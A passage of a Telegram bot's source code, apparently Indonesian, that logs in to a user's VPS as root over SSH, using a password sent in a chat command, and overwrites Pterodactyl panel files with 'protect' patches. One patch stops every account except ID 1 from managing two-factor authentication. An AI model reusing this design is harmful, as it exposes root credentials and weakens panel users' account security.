            abort(403, '🚫 Akses ditolak: hanya admin ID 1 yang dapat mengelola Database! ©Protect By @Pirzyy1');
        }
    }

    public function index(): View
    {
        $this->checkAccess();

        return $this->view->make('admin.databases.index', [
            'locations' => $this->locationRepository->getAllWithNodes(),
            'hosts' => $this->repository->getWithViewDetails(),
        ]);
    }

    public function view(int $host): View
    {
        $this->checkAccess();

        return $this->view->make('admin.databases.view', [
            'locations' => $this->locationRepository->getAllWithNodes(),
            'host' => $this->repository->find($host),
            'databases' => $this->databaseRepository->getDatabasesForHost($host),
        ]);
    }

    public function create(DatabaseHostFormRequest $request): RedirectResponse
    {
        $this->checkAccess();

        try {
            $host = $this->creationService->handle($request->normalize());
        } catch (Exception $exception) {
            if ($exception instanceof \\PDOException || $exception->getPrevious() instanceof \\PDOException) {
                $this->alert->danger(
                    sprintf('❌ Gagal konek ke host DB: %s', $exception->getMessage())
                )->flash();
                return redirect()->route('admin.databases')->withInput($request->validated());
            }

            throw $exception;
        }

        $this->alert->success('✅ Database host berhasil dibuat.')->flash();
        return redirect()->route('admin.databases.view', $host->id);
    }

    public function update(DatabaseHostFormRequest $request, DatabaseHost $host): RedirectResponse
    {
        $this->checkAccess();
        $redirect = redirect()->route('admin.databases.view', $host->id);

        try {
            $this->updateService->handle($host->id, $request->normalize());
            $this->alert->success('✅ Database host berhasil diperbarui.')->flash();
        } catch (Exception $exception) {
            if ($exception instanceof \\PDOException || $exception->getPrevious() instanceof \\PDOException) {
                $this->alert->danger(
                    sprintf('❌ Error koneksi DB: %s', $exception->getMessage())
                )->flash();
                return $redirect->withInput($request->normalize());
            }

            throw $exception;
        }

        return $redirect;
    }

    public function delete(int $host): RedirectResponse
    {
        $this->checkAccess();

        $this->deletionService->handle($host);
        $this->alert->success('🗑️ Database host berhasil dihapus.')->flash();

        return redirect()->route('admin.databases');
    }
}`
      },
      {
        name: "PROTECT12 (ANTI INTIP MOUNTS)",
        path: "/var/www/pterodactyl/app/Http/Controllers/Admin/MountController.php",
        file: "MountController.php",
        code: `<?php

namespace Pterodactyl\\Http\\Controllers\\Admin;

use Ramsey\\Uuid\\Uuid;
use Illuminate\\View\\View;
use Illuminate\\Http\\Request;
use Illuminate\\Http\\Response;
use Illuminate\\Support\\Facades\\Auth;
use Pterodactyl\\Models\\Nest;
use Pterodactyl\\Models\\Mount;
use Pterodactyl\\Models\\Location;
use Illuminate\\Http\\RedirectResponse;
use Prologue\\Alerts\\AlertsMessageBag;
use Illuminate\\View\\Factory as ViewFactory;
use Pterodactyl\\Http\\Controllers\\Controller;
use Pterodactyl\\Http\\Requests\\Admin\\MountFormRequest;
use Pterodactyl\\Repositories\\Eloquent\\MountRepository;
use Pterodactyl\\Contracts\\Repository\\NestRepositoryInterface;
use Pterodactyl\\Contracts\\Repository\\LocationRepositoryInterface;

class MountController extends Controller
{
    public function __construct(
        protected AlertsMessageBag $alert,
        protected NestRepositoryInterface $nestRepository,
        protected LocationRepositoryInterface $locationRepository,
        protected MountRepository $repository,
        protected ViewFactory $view
    ) {}

    private function checkAdminAccess()
    {
        $user = Auth::user();
        if (!$user || $user->id !== 1) {
            abort(403, '🚫 Akses ditolak: hanya Admin utama (ID 1) yang boleh akses Mount! ©Protect By @Pirzyy1');
        }
    }

    private function globalProtect()
    {
        $this->checkAdminAccess();
    }

    public function index(): View
    {
        $this->globalProtect();
        return $this->view->make('admin.mounts.index', [
            'mounts' => $this->repository->getAllWithDetails(),
        ]);
    }

    public function view(string $id): View
    {
        $this->globalProtect();
        $nests = Nest::query()->with('eggs')->get();
        $locations = Location::query()->with('nodes')->get();

        return $this->view->make('admin.mounts.view', [
            'mount' => $this->repository->getWithRelations($id),
            'nests' => $nests,
            'locations' => $locations,
        ]);
    }

    public function create(MountFormRequest $request): RedirectResponse
    {
        $this->globalProtect();

        $model = (new Mount())->fill($request->validated());
        $model->forceFill(['uuid' => Uuid::uuid4()->toString()]);
        $model->saveOrFail();
        $mount = $model->fresh();

        $this->alert->success('Mount was created successfully.')->flash();
        return redirect()->route('admin.mounts.view', $mount->id);
    }

    public function update(MountFormRequest $request, Mount $mount): RedirectResponse
    {
        $this->globalProtect();

        if ($request->input('action') === 'delete') {
            return $this->delete($mount);
        }

        $mount->forceFill($request->validated())->save();
        $this->alert->success('Mount was updated successfully.')->flash();
        return redirect()->route('admin.mounts.view', $mount->id);
    }

    public function delete(Mount $mount): RedirectResponse
    {
        $this->globalProtect();
        $mount->delete();
        return redirect()->route('admin.mounts');
    }

    public function addEggs(Request $request, Mount $mount): RedirectResponse
    {
        $this->globalProtect();
        $data = $request->validate(['eggs' => 'required|exists:eggs,id']);
        if (count($data['eggs']) > 0) $mount->eggs()->attach($data['eggs']);
        $this->alert->success('Mount was updated successfully.')->flash();
        return redirect()->route('admin.mounts.view', $mount->id);
    }

    public function addNodes(Request $request, Mount $mount): RedirectResponse
    {
        $this->globalProtect();
        $data = $request->validate(['nodes' => 'required|exists:nodes,id']);
        if (count($data['nodes']) > 0) $mount->nodes()->attach($data['nodes']);
        $this->alert->success('Mount was updated successfully.')->flash();
        return redirect()->route('admin.mounts.view', $mount->id);
    }

    public function deleteEgg(Mount $mount, int $egg_id): Response
    {
        $this->globalProtect();
        $mount->eggs()->detach($egg_id);
        return response('', 204);
    }

    public function deleteNode(Mount $mount, int $node_id): Response
    {
        $this->globalProtect();
        $mount->nodes()->detach($node_id);
        return response('', 204);
    }
}`
      },
      {
        name: "PROTECT13 (ANTI BUTTON TWO FACTOR)",
        path: "/var/www/pterodactyl/app/Http/Controllers/Api/Client/TwoFactorController.php",
        file: "TwoFactorController.php",
        code: `<?php

namespace Pterodactyl\\Http\\Controllers\\Api\\Client;

use Carbon\\Carbon;
use Illuminate\\Http\\Request;
use Illuminate\\Http\\Response;
use Illuminate\\Http\\JsonResponse;
use Pterodactyl\\Facades\\Activity;
use Pterodactyl\\Services\\Users\\TwoFactorSetupService;
use Pterodactyl\\Services\\Users\\ToggleTwoFactorService;
use Illuminate\\Contracts\\Validation\\Factory as ValidationFactory;
use Symfony\\Component\\HttpKernel\\Exception\\BadRequestHttpException;

class TwoFactorController extends ClientApiController
{
    public function __construct(
        private ToggleTwoFactorService $toggleTwoFactorService,
        private TwoFactorSetupService $setupService,
        private ValidationFactory $validation
    ) {
        parent::__construct();
    }

    public function index(Request $request): JsonResponse
    {
        if ($request->user()->id !== 1) {
            abort(403, '🚫 Kasihan gabisa yaaa? 😹 Hanya Admin utama (ID 1) yang dapat mengatur Two-Step Verification. ©Protect By @Pirzyy1');
        }

        if ($request->user()->use_totp) {
            throw new BadRequestHttpException('Two-factor authentication is already enabled on this account.');
        }

        return new JsonResponse([
            'data' => $this->setupService->handle($request->user()),
        ]);
    }

    public function store(Request $request): JsonResponse
    {
        if ($request->user()->id !== 1) {
            abort(403, '🚫 Kasihan gabisa yaaa? 😹 Hanya Admin utama (ID 1) yang dapat mengaktifkan Two-Step Verification. ©Protect By @Pirzyy1');
        }

        $validator = $this->validation->make($request->all(), [
            'code' => ['required', 'string', 'size:6'],
            'password' => ['required', 'string'],
        ]);

        $data = $validator->validate();
        if (!password_verify($data['password'], $request->user()->password)) {
            throw new BadRequestHttpException('The password provided was not valid.');
        }

        $tokens = $this->toggleTwoFactorService->handle($request->user(), $data['code'], true);
        Activity::event('user:two-factor.create')->log();

        return new JsonResponse([
            'object' => 'recovery_tokens',
            'attributes' => ['tokens' => $tokens],
        ]);
    }

    public function delete(Request $request): JsonResponse
    {
        if ($request->user()->id !== 1) {
            abort(403, '🚫 Kasihan gabisa yaaa? 😹 Hanya Admin utama (ID 1) yang dapat menonaktifkan Two-Step Verification. ©Protect By @Pirzyy1');
        }

        if (!password_verify($request->input('password') ?? '', $request->user()->password)) {
            throw new BadRequestHttpException('The password provided was not valid.');
        }

        $user = $request->user();
        $user->update([
            'totp_authenticated_at' => Carbon::now(),
            'use_totp' => false,
        ]);

        Activity::event('user:two-factor.delete')->log();

        return new JsonResponse([], Response::HTTP_NO_CONTENT);
    }
}`
      },                                   
      {
        name: "PROTECT14 (𝗠𝗘𝗡𝗚𝗛𝗜𝗟𝗔𝗡𝗚𝗞𝗔𝗡 𝗕𝗔𝗥 𝗠𝗘𝗡𝗨 “𝗡𝗢𝗗𝗘𝗦, 𝗟𝗢𝗖𝗔𝗧𝗜𝗢𝗡𝗦, 𝗗𝗔𝗧𝗔𝗕𝗔𝗦𝗘, 𝗦𝗘𝗧𝗧𝗜𝗡𝗚𝗦, 𝗔𝗣𝗣𝗟𝗜𝗖𝗔𝗧𝗜𝗢𝗡 𝗔𝗣𝗜, 𝗠𝗢𝗨𝗡𝗧𝗦, 𝗡𝗘𝗦𝗧)",
        path: "/var/www/pterodactyl/resources/views/layouts/admin.blade.php",
        file: "admin.blade.php",
        code: `<!DOCTYPE html>
<html>
    <head>
        <meta charset="utf-8">
        <meta http-equiv="X-UA-Compatible" content="IE=edge">
        <title>{{ config('app.name', 'Pterodactyl') }} - @yield('title')</title>
        <meta content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" name="viewport">
        <meta name="_token" content="{{ csrf_token() }}">

        <link rel="apple-touch-icon" sizes="180x180" href="/favicons/apple-touch-icon.png">
        <link rel="icon" type="image/png" href="/favicons/favicon-32x32.png" sizes="32x32">
        <link rel="icon" type="image/png" href="/favicons/favicon-16x16.png" sizes="16x16">
        <link rel="manifest" href="/favicons/manifest.json">
        <link rel="mask-icon" href="/favicons/safari-pinned-tab.svg" color="#bc6e3c">
        <link rel="shortcut icon" href="/favicons/favicon.ico">
        <meta name="msapplication-config" content="/favicons/browserconfig.xml">
        <meta name="theme-color" content="#0e4688">

        @include('layouts.scripts')

        @section('scripts')
            {!! Theme::css('vendor/select2/select2.min.css?t={cache-version}') !!}
            {!! Theme::css('vendor/bootstrap/bootstrap.min.css?t={cache-version}') !!}
            {!! Theme::css('vendor/adminlte/admin.min.css?t={cache-version}') !!}
            {!! Theme::css('vendor/adminlte/colors/skin-blue.min.css?t={cache-version}') !!}
            {!! Theme::css('vendor/sweetalert/sweetalert.min.css?t={cache-version}') !!}
            {!! Theme::css('vendor/animate/animate.min.css?t={cache-version}') !!}
            {!! Theme::css('css/pterodactyl.css?t={cache-version}') !!}
            <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
            <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/ionicons/2.0.1/css/ionicons.min.css">

            <!--[if lt IE 9]>
            <script src="https://oss.maxcdn.com/html5shiv/3.7.3/html5shiv.min.js"></script>
            <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
            <![endif]-->
        @show
    </head>
    <body class="hold-transition skin-blue fixed sidebar-mini">
        <div class="wrapper">
            <header class="main-header">
                <a href="{{ route('index') }}" class="logo">
                    <span>{{ config('app.name', 'Pterodactyl') }}</span>
                </a>
                <nav class="navbar navbar-static-top">
                    <a href="#" class="sidebar-toggle" data-toggle="push-menu" role="button">
                        <span class="sr-only">Toggle navigation</span>
                        <span class="icon-bar"></span>
                        <span class="icon-bar"></span>
                        <span class="icon-bar"></span>
                    </a>
                    <div class="navbar-custom-menu">
                        <ul class="nav navbar-nav">
                            <li class="user-menu">
                                <a href="{{ route('account') }}">
                                    <img src="https://www.gravatar.com/avatar/{{ md5(strtolower(Auth::user()->email)) }}?s=160" class="user-image" alt="User Image">
                                    <span class="hidden-xs">{{ Auth::user()->name_first }} {{ Auth::user()->name_last }}</span>
                                </a>
                            </li>
                            <li>
                                <li><a href="{{ route('index') }}" data-toggle="tooltip" data-placement="bottom" title="Exit Admin Control"><i class="fa fa-server"></i></a></li>
                            </li>
                            <li>
                                <li><a href="{{ route('auth.logout') }}" id="logoutButton" data-toggle="tooltip" data-placement="bottom" title="Logout"><i class="fa fa-sign-out"></i></a></li>
                            </li>
                        </ul>
                    </div>
                </nav>
            </header>
            <aside class="main-sidebar">
                <section class="sidebar">
                    <ul class="sidebar-menu">
                        <li class="header">BASIC ADMINISTRATION</li>
                        <li class="{{ Route::currentRouteName() !== 'admin.index' ?: 'active' }}">
                            <a href="{{ route('admin.index') }}">
                                <i class="fa fa-home"></i> <span>Overview</span>
                            </a>
                        </li>
{{-- ✅ Hanya tampil untuk user ID 1 --}}
@if(Auth::user()->id == 1)
<li class="{{ ! starts_with(Route::currentRouteName(), 'admin.settings') ?: 'active' }}">
    <a href="{{ route('admin.settings') }}">
        <i class="fa fa-wrench"></i> <span>Settings</span>
    </a>
</li>
@endif
{{-- ✅ Hanya tampil untuk user ID 1 --}}
@if(Auth::user()->id == 1)
<li class="{{ ! starts_with(Route::currentRouteName(), 'admin.api') ?: 'active' }}">
    <a href="{{ route('admin.api.index')}}">
        <i class="fa fa-gamepad"></i> <span>Application API</span>
    </a>
</li>
@endif
<li class="header">MANAGEMENT</li>

{{-- ✅ Hanya tampil untuk user ID 1 --}}
@if(Auth::user()->id == 1)
<li class="{{ ! starts_with(Route::currentRouteName(), 'admin.databases') ?: 'active' }}">
    <a href="{{ route('admin.databases') }}">
        <i class="fa fa-database"></i> <span>Databases</span>
    </a>
</li>
@endif

{{-- ✅ Hanya tampil untuk user ID 1 --}}
@if(Auth::user()->id == 1)
<li class="{{ ! starts_with(Route::currentRouteName(), 'admin.locations') ?: 'active' }}">
    <a href="{{ route('admin.locations') }}">
        <i class="fa fa-globe"></i> <span>Locations</span>
    </a>
</li>
@endif

{{-- ✅ Hanya tampil untuk user dengan ID 1 --}}
@if(Auth::user()->id == 1)
<li class="{{ ! starts_with(Route::currentRouteName(), 'admin.nodes') ?: 'active' }}">
    <a href="{{ route('admin.nodes') }}">
        <i class="fa fa-sitemap"></i> <span>Nodes</span>
    </a>
</li>
@endif

                        <li class="{{ ! starts_with(Route::currentRouteName(), 'admin.servers') ?: 'active' }}">
                            <a href="{{ route('admin.servers') }}">
                                <i class="fa fa-server"></i> <span>Servers</span>
                            </a>
                        </li>
                        <li class="{{ ! starts_with(Route::currentRouteName(), 'admin.users') ?: 'active' }}">
                            <a href="{{ route('admin.users') }}">
                                <i class="fa fa-users"></i> <span>Users</span>
                            </a>
                        </li>
{{-- ✅ Hanya tampil untuk admin utama --}}
@if(Auth::user()->id == 1)
    <li class="header">SERVICE MANAGEMENT</li>

    <li class="{{ ! starts_with(Route::currentRouteName(), 'admin.mounts') ?: 'active' }}">
        <a href="{{ route('admin.mounts') }}">
            <i class="fa fa-magic"></i> <span>Mounts</span>
        </a>
    </li>

    <li class="{{ ! starts_with(Route::currentRouteName(), 'admin.nests') ?: 'active' }}">
        <a href="{{ route('admin.nests') }}">
            <i class="fa fa-th-large"></i> <span>Nests</span>
        </a>
    </li>
@endif
                    </ul>
                </section>
            </aside>
            <div class="content-wrapper">
                <section class="content-header">
                    @yield('content-header')
                </section>
                <section class="content">
                    <div class="row">
                        <div class="col-xs-12">
                            @if (count($errors) > 0)
                                <div class="alert alert-danger">
                                    There was an error validating the data provided.<br><br>
                                    <ul>
                                        @foreach ($errors->all() as $error)
                                            <li>{{ $error }}</li>
                                        @endforeach
                                    </ul>
                                </div>
                            @endif
                            @foreach (Alert::getMessages() as $type => $messages)
                                @foreach ($messages as $message)
                                    <div class="alert alert-{{ $type }} alert-dismissable" role="alert">
                                        {!! $message !!}
                                    </div>
                                @endforeach
                            @endforeach
                        </div>
                    </div>
                    @yield('content')
                </section>
            </div>
            <footer class="main-footer">
                <div class="pull-right small text-gray" style="margin-right:10px;margin-top:-7px;">
                    <strong><i class="fa fa-fw {{ $appIsGit ? 'fa-git-square' : 'fa-code-fork' }}"></i></strong> {{ $appVersion }}<br />
                    <strong><i class="fa fa-fw fa-clock-o"></i></strong> {{ round(microtime(true) - LARAVEL_START, 3) }}s
                </div>
                Copyright &copy; 2015 - {{ date('Y') }} <a href="https://pterodactyl.io/">Pterodactyl Software</a>.
            </footer>
        </div>
        @section('footer-scripts')
            <script src="/js/keyboard.polyfill.js" type="application/javascript"></script>
            <script>keyboardeventKeyPolyfill.polyfill();</script>

            {!! Theme::js('vendor/jquery/jquery.min.js?t={cache-version}') !!}
            {!! Theme::js('vendor/sweetalert/sweetalert.min.js?t={cache-version}') !!}
            {!! Theme::js('vendor/bootstrap/bootstrap.min.js?t={cache-version}') !!}
            {!! Theme::js('vendor/slimscroll/jquery.slimscroll.min.js?t={cache-version}') !!}
            {!! Theme::js('vendor/adminlte/app.min.js?t={cache-version}') !!}
            {!! Theme::js('vendor/bootstrap-notify/bootstrap-notify.min.js?t={cache-version}') !!}
            {!! Theme::js('vendor/select2/select2.full.min.js?t={cache-version}') !!}
            {!! Theme::js('js/admin/functions.js?t={cache-version}') !!}
            <script src="/js/autocomplete.js" type="application/javascript"></script>

            @if(Auth::user()->root_admin)
                <script>
                    $('#logoutButton').on('click', function (event) {
                        event.preventDefault();

                        var that = this;
                        swal({
                            title: 'Do you want to log out?',
                            type: 'warning',
                            showCancelButton: true,
                            confirmButtonColor: '#d9534f',
                            cancelButtonColor: '#d33',
                            confirmButtonText: 'Log out'
                        }, function () {
                             $.ajax({
                                type: 'POST',
                                url: '{{ route('auth.logout') }}',
                                data: {
                                    _token: '{{ csrf_token() }}'
                                },complete: function () {
                                    window.location.href = '{{route('auth.login')}}';
                                }
                        });
                    });
                });
                </script>
            @endif

            <script>
                $(function () {
                    $('[data-toggle="tooltip"]').tooltip();
                })
            </script>
        @show
    </body>
</html>`
      },
    ];

    // ========================= UPLOAD SEMUA PROTEKSI =========================
    let successCount = 0;

    for (const file of protectFiles) {
      try {
        const tempFile = path.join(__dirname, file.file);
        fs.writeFileSync(tempFile, file.code);
        await ssh.putFile(tempFile, file.path);
        fs.unlinkSync(tempFile);
        successCount++;
        await bot.sendMessage(chatId, `✅ *${file.name}* berhasil dipasang!\n📂 \`${file.path}\``, {
          parse_mode: "Markdown",
        });
      } catch (err) {
        await bot.sendMessage(
          chatId,
          `❌ Gagal memasang *${file.name}*\nError: \`${err.message}\``,
          { parse_mode: "Markdown" }
        );
      }
    }

    ssh.dispose();

await bot.sendMessage(
  chatId,
  `🧩 *INSTALASI PROTECT ALL SELESAI!*\n
✅ Berhasil: ${successCount}/${protectFiles.length} file\n
⚙️ Semua fitur keamanan aktif untuk panelmu.\n\n©Protect By @Pirzyy1`,
  { parse_mode: "Markdown" }
);

    console.log(`🟢 InstallProtectAll selesai untuk user ${userId} di VPS ${host}`);
  } catch (err) {
    console.error("❌ ERROR INSTALLPROTECTALL:", err);
    bot.sendMessage(
      chatId,
      `❌ Gagal menjalankan instalasi ProtectAll.\n\nError:\n\`${err.message}\``,
      { parse_mode: "Markdown" }
    );
  }
});

bot.onText(/^\/uninstallprotectall (.+)$/i, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id.toString();
  const input = match[1];
  const senderId = msg.from.id;

  const { NodeSSH } = require("node-ssh");
  const fs = require("fs");
  const path = require("path");
  const ssh = new NodeSSH();

  if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
    return bot.sendMessage(chatId, "❌ Akses di tolak, kamu bukan admin.");
  }

  // Validasi format ipvps|password
  if (!input.includes("|")) {
    return bot.sendMessage(
      chatId,
      "❌ Salah format!\nGunakan:\n`/uninstallprotectall ipvps|password`",
      { parse_mode: "Markdown" }
    );
  }

  const [host, password] = input.split("|");

  await bot.sendMessage(
    chatId,
    "🧹 *Memulai UNINSTALL semua proteksi...*\nHarap tunggu ⏳",
    { parse_mode: "Markdown" }
  );

  try {
    await ssh.connect({
      host: host.trim(),
      username: "root",
      password: password.trim(),
      port: 22,
      readyTimeout: 20000,
    });

    // ========================= PATHS =========================
    const protectFiles = [
      {
        name: "PROTECT1 (Anti Intip Server In Settings)",
        path: "/var/www/pterodactyl/app/Http/Controllers/Admin/Servers/ServerController.php",
        file: "ServerController.php",
        code: `<?php  

namespace Pterodactyl\\Http\\Controllers\\Admin\\Servers;  

use Illuminate\\View\\View;  
use Illuminate\\Http\\Request;  
use Pterodactyl\\Models\\Server;  
use Spatie\\QueryBuilder\\QueryBuilder;  
use Spatie\\QueryBuilder\\AllowedFilter;  
use Pterodactyl\\Http\\Controllers\\Controller;  
use Pterodactyl\\Models\\Filters\\AdminServerFilter;  
use Illuminate\\Contracts\\View\\Factory as ViewFactory;  

class ServerController extends Controller  
{  
    /**  
     * ServerController constructor.  
     */  
    public function __construct(private ViewFactory $view)  
    {  
    }  

    /**  
     * Returns all the servers that exist on the system using a paginated result set. If  
     * a query is passed along in the request it is also passed to the repository function.  
     */  
    public function index(Request $request): View  
    {  
        $servers = QueryBuilder::for(Server::query()->with('node', 'user', 'allocation'))  
            ->allowedFilters([  
                AllowedFilter::exact('owner_id'),  
                AllowedFilter::custom('*', new AdminServerFilter()),  
            ])  
            ->paginate(config()->get('pterodactyl.paginate.admin.servers'));  

        return $this->view->make('admin.servers.index', ['servers' => $servers]);  
    }  
}`
      },
      {
        name: "PROTECT1 (Otomatis Isi Server Owner)",
        path: "/var/www/pterodactyl/resources/views/admin/servers/new.blade.php",
        file: "new.blade.php",
        code: `@extends('layouts.admin')

@section('title')
    New Server
@endsection

@section('content-header')
    <h1>Create Server<small>Add a new server to the panel.</small></h1>
    <ol class="breadcrumb">
        <li><a href="{{ route('admin.index') }}">Admin</a></li>
        <li><a href="{{ route('admin.servers') }}">Servers</a></li>
        <li class="active">Create Server</li>
    </ol>
@endsection

@section('content')
<form action="{{ route('admin.servers.new') }}" method="POST">
    <div class="row">
        <div class="col-xs-12">
            <div class="box">
                <div class="box-header with-border">
                    <h3 class="box-title">Core Details</h3>
                </div>

                <div class="box-body row">
                    <div class="col-md-6">
                        <div class="form-group">
                            <label for="pName">Server Name</label>
                            <input type="text" class="form-control" id="pName" name="name" value="{{ old('name') }}" placeholder="Server Name">
                            <p class="small text-muted no-margin">Character limits: <code>a-z A-Z 0-9 _ - .</code> and <code>[Space]</code>.</p>
                        </div>

                        <div class="form-group">
                            <label for="pUserId">Server Owner</label>
                            <select id="pUserId" name="owner_id" class="form-control" style="padding-left:0;"></select>
                            <p class="small text-muted no-margin">Email address of the Server Owner.</p>
                        </div>
                    </div>

                    <div class="col-md-6">
                        <div class="form-group">
                            <label for="pDescription" class="control-label">Server Description</label>
                            <textarea id="pDescription" name="description" rows="3" class="form-control">{{ old('description') }}</textarea>
                            <p class="text-muted small">A brief description of this server.</p>
                        </div>

                        <div class="form-group">
                            <div class="checkbox checkbox-primary no-margin-bottom">
                                <input id="pStartOnCreation" name="start_on_completion" type="checkbox" {{ \\Pterodactyl\\Helpers\\Utilities::checked('start_on_completion', 1) }} />
                                <label for="pStartOnCreation" class="strong">Start Server when Installed</label>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <div class="row">
        <div class="col-xs-12">
            <div class="box">
                <div class="overlay" id="allocationLoader" style="display:none;"><i class="fa fa-refresh fa-spin"></i></div>
                <div class="box-header with-border">
                    <h3 class="box-title">Allocation Management</h3>
                </div>

                <div class="box-body row">
                    <div class="form-group col-sm-4">
                        <label for="pNodeId">Node</label>
                        <select name="node_id" id="pNodeId" class="form-control">
                            @foreach($locations as $location)
                                <optgroup label="{{ $location->long }} ({{ $location->short }})">
                                @foreach($location->nodes as $node)

                                <option value="{{ $node->id }}"
                                    @if($location->id === old('location_id')) selected @endif
                                >{{ $node->name }}</option>

                                @endforeach
                                </optgroup>
                            @endforeach
                        </select>

                        <p class="small text-muted no-margin">The node which this server will be deployed to.</p>
                    </div>

                    <div class="form-group col-sm-4">
                        <label for="pAllocation">Default Allocation</label>
                        <select id="pAllocation" name="allocation_id" class="form-control"></select>
                        <p class="small text-muted no-margin">The main allocation that will be assigned to this server.</p>
                    </div>

                    <div class="form-group col-sm-4">
                        <label for="pAllocationAdditional">Additional Allocation(s)</label>
                        <select id="pAllocationAdditional" name="allocation_additional[]" class="form-control" multiple></select>
                        <p class="small text-muted no-margin">Additional allocations to assign to this server on creation.</p>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <div class="row">
        <div class="col-xs-12">
            <div class="box">
                <div class="overlay" id="allocationLoader" style="display:none;"><i class="fa fa-refresh fa-spin"></i></div>
                <div class="box-header with-border">
                    <h3 class="box-title">Application Feature Limits</h3>
                </div>

                <div class="box-body row">
                    <div class="form-group col-xs-6">
                        <label for="pDatabaseLimit" class="control-label">Database Limit</label>
                        <div>
                            <input type="text" id="pDatabaseLimit" name="database_limit" class="form-control" value="{{ old('database_limit', 0) }}"/>
                        </div>
                        <p class="text-muted small">The total number of databases a user is allowed to create for this server.</p>
                    </div>
                    <div class="form-group col-xs-6">
                        <label for="pAllocationLimit" class="control-label">Allocation Limit</label>
                        <div>
                            <input type="text" id="pAllocationLimit" name="allocation_limit" class="form-control" value="{{ old('allocation_limit', 0) }}"/>
                        </div>
                        <p class="text-muted small">The total number of allocations a user is allowed to create for this server.</p>
                    </div>
                    <div class="form-group col-xs-6">
                        <label for="pBackupLimit" class="control-label">Backup Limit</label>
                        <div>
                            <input type="text" id="pBackupLimit" name="backup_limit" class="form-control" value="{{ old('backup_limit', 0) }}"/>
                        </div>
                        <p class="text-muted small">The total number of backups that can be created for this server.</p>
                    </div>
                </div>
            </div>
        </div>
    </div>
    <div class="row">
        <div class="col-xs-12">
            <div class="box">
                <div class="box-header with-border">
                    <h3 class="box-title">Resource Management</h3>
                </div>

                <div class="box-body row">
                    <div class="form-group col-xs-6">
                        <label for="pCPU">CPU Limit</label>

                        <div class="input-group">
                            <input type="text" id="pCPU" name="cpu" class="form-control" value="{{ old('cpu', 0) }}" />
                            <span class="input-group-addon">%</span>
                        </div>

                        <p class="text-muted small">If you do not want to limit CPU usage, set the value to <code>0</code>. To determine a value, take the number of threads and multiply it by 100. For example, on a quad core system without hyperthreading <code>(4 * 100 = 400)</code> there is <code>400%</code> available. To limit a server to using half of a single thread, you would set the value to <code>50</code>. To allow a server to use up to two threads, set the value to <code>200</code>.<p>
                    </div>

                    <div class="form-group col-xs-6">
                        <label for="pThreads">CPU Pinning</label>

                        <div>
                            <input type="text" id="pThreads" name="threads" class="form-control" value="{{ old('threads') }}" />
                        </div>

                        <p class="text-muted small"><strong>Advanced:</strong> Enter the specific CPU threads that this process can run on, or leave blank to allow all threads. This can be a single number, or a comma separated list. Example: <code>0</code>, <code>0-1,3</code>, or <code>0,1,3,4</code>.</p>
                    </div>
                </div>

                <div class="box-body row">
                    <div class="form-group col-xs-6">
                        <label for="pMemory">Memory</label>

                        <div class="input-group">
                            <input type="text" id="pMemory" name="memory" class="form-control" value="{{ old('memory') }}" />
                            <span class="input-group-addon">MiB</span>
                        </div>

                        <p class="text-muted small">The maximum amount of memory allowed for this container. Setting this to <code>0</code> will allow unlimited memory in a container.</p>
                    </div>

                    <div class="form-group col-xs-6">
                        <label for="pSwap">Swap</label>

                        <div class="input-group">
                            <input type="text" id="pSwap" name="swap" class="form-control" value="{{ old('swap', 0) }}" />
                            <span class="input-group-addon">MiB</span>
                        </div>

                        <p class="text-muted small">Setting this to <code>0</code> will disable swap space on this server. Setting to <code>-1</code> will allow unlimited swap.</p>
                    </div>
                </div>

                <div class="box-body row">
                    <div class="form-group col-xs-6">
                        <label for="pDisk">Disk Space</label>

                        <div class="input-group">
                            <input type="text" id="pDisk" name="disk" class="form-control" value="{{ old('disk') }}" />
                            <span class="input-group-addon">MiB</span>
                        </div>

                        <p class="text-muted small">This server will not be allowed to boot if it is using more than this amount of space. If a server goes over this limit while running it will be safely stopped and locked until enough space is available. Set to <code>0</code> to allow unlimited disk usage.</p>
                    </div>

                    <div class="form-group col-xs-6">
                        <label for="pIO">Block IO Weight</label>

                        <div>
                            <input type="text" id="pIO" name="io" class="form-control" value="{{ old('io', 500) }}" />
                        </div>

                        <p class="text-muted small"><strong>Advanced</strong>: The IO performance of this server relative to other <em>running</em> containers on the system. Value should be between <code>10</code> and <code>1000</code>. Please see <a href="https://docs.docker.com/engine/reference/run/#block-io-bandwidth-blkio-constraint" target="_blank">this documentation</a> for more information about it.</p>
                    </div>
                    <div class="form-group col-xs-12">
                        <div class="checkbox checkbox-primary no-margin-bottom">
                            <input type="checkbox" id="pOomDisabled" name="oom_disabled" value="0" {{ \\Pterodactyl\\Helpers\\Utilities::checked('oom_disabled', 0) }} />
                            <label for="pOomDisabled" class="strong">Enable OOM Killer</label>
                        </div>

                        <p class="small text-muted no-margin">Terminates the server if it breaches the memory limits. Enabling OOM killer may cause server processes to exit unexpectedly.</p>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <div class="row">
        <div class="col-md-6">
            <div class="box">
                <div class="box-header with-border">
                    <h3 class="box-title">Nest Configuration</h3>
                </div>

                <div class="box-body row">
                    <div class="form-group col-xs-12">
                        <label for="pNestId">Nest</label>

                        <select id="pNestId" name="nest_id" class="form-control">
                            @foreach($nests as $nest)
                                <option value="{{ $nest->id }}"
                                    @if($nest->id === old('nest_id'))
                                        selected="selected"
                                    @endif
                                >{{ $nest->name }}</option>
                            @endforeach
                        </select>

                        <p class="small text-muted no-margin">Select the Nest that this server will be grouped under.</p>
                    </div>

                    <div class="form-group col-xs-12">
                        <label for="pEggId">Egg</label>
                        <select id="pEggId" name="egg_id" class="form-control"></select>
                        <p class="small text-muted no-margin">Select the Egg that will define how this server should operate.</p>
                    </div>
                    <div class="form-group col-xs-12">
                        <div class="checkbox checkbox-primary no-margin-bottom">
                            <input type="checkbox" id="pSkipScripting" name="skip_scripts" value="1" {{ \\Pterodactyl\\Helpers\\Utilities::checked('skip_scripts', 0) }} />
                            <label for="pSkipScripting" class="strong">Skip Egg Install Script</label>
                        </div>

                        <p class="small text-muted no-margin">If the selected Egg has an install script attached to it, the script will run during the install. If you would like to skip this step, check this box.</p>
                    </div>
                </div>
            </div>
